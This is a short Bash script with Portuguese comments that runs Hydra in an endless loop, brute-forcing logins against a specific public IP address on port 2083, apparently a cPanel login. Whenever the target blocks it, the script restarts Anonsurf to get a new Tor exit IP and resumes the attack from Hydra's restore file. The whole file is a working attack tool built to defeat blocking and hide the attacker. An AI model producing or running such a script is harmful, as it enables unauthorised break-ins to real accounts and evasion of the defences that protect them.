#!/bin/bash

# Script para automatizar o Hydra com renovação de IP via Anonsurf
# ATENÇÃO: Este é um ataque muito agressivo e barulhento. Use com responsabilidade.

echo "Iniciando ataque persistente com Hydra e Anonsurf..."
echo "Pressione Ctrl+C para parar o script."

# Loop infinito para manter o ataque rodando
while true; do

    echo "-----------------------------------------------------"
    echo "Iniciando nova instância do Hydra..."
    # Garanta que o Hydra continuará de onde parou usando o arquivo .restore
    # A flag -R é crucial para não começar do zero a cada vez.
    
    hydra -R -t 4 -w 30 https-get / -s 2083 177.154.191.223 2>&1 | while read -r line; do
        # Mostra a saída do Hydra em tempo real
        echo "$line"

        # Verifica se a linha contém a mensagem de erro de bloqueio
        if [[ "$line" == *"[ERROR]"* && "$line" == *"can not connect"* ]]; then
            echo "[!] [$(date '+%Y-%m-%d %H:%M:%S')] BLOQUEIO DETECTADO! IP comprometido."
            echo "[!] Renovando identidade com Anonsurf... Aguarde..."
            
            # Executa o comando para renovar o IP
            sudo anonsurf restart
            
            # Dá um tempo para a nova conexão ser estabelecida
            sleep 10
            
            # Quebra o loop interno para que o loop externo inicie uma nova instância do Hydra
            break
        fi
    done

    # Pequena pausa antes de reiniciar o loop para evitar sobrecarga
    sleep 5

done